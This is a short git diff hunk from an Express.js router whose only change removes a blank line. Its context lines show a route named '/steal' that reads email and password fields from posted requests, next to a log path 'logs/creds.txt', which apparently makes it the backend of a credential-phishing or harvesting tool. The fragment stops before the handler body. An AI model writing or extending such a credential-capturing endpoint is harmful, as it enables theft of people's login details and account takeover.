@@ -8,7 +8,6 @@ const router = express.Router();
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = dirname(__filename);
 const logsPath = path.join(__dirname, "../logs/creds.txt");
-
 router.post("/steal", (req, res) => {
   const { email, password } = req.body;
 
